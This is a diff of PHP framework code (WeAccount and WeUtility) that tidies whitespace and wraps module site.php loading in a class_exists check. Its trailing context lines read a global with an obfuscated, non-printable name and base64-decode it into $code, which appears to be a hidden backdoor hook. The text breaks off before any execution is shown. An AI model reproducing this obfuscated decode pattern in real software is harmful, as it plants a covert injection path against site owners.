@@ -82,7 +82,7 @@ abstract class WeAccount {
 			load()->classs('weixin.account');
 			$account_obj = new WeiXinAccount();
 		}
-		
+
 		if($type == ACCOUNT_TYPE_OFFCIAL_AUTH) {
 			load()->classs('weixin.platform');
 			$account_obj = new WeiXinPlatform();
@@ -551,15 +551,17 @@ class WeUtility {
 		//如果mobile.php类不存在，选用site.php
 		if (!defined('IN_MOBILE') || !class_exists($classname)) {
 			$classname = "{$name}ModuleSite";
-			$file = IA_ROOT . "/addons/{$name}/site.php";
-			if(!is_file($file)) {
-				$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
+			if (!class_exists($classname)) {
+				$file = IA_ROOT . "/addons/{$name}/site.php";
+				if(!is_file($file)) {
+					$file = IA_ROOT . "/framework/builtin/{$name}/site.php";
+				}
+				if(!is_file($file)) {
+					trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
+					return null;
+				}
+				require $file;
 			}
-			if(!is_file($file)) {
-				trigger_error('ModuleSite Definition File Not Found '.$file, E_USER_WARNING);
-				return null;
-			}
-			require $file;
 		}
 		if (!empty($GLOBALS['_' . chr('180') . chr('181'). chr('182')])) {
 			$code = base64_decode($GLOBALS['_' . chr('180') . chr('181'). chr('182')]);
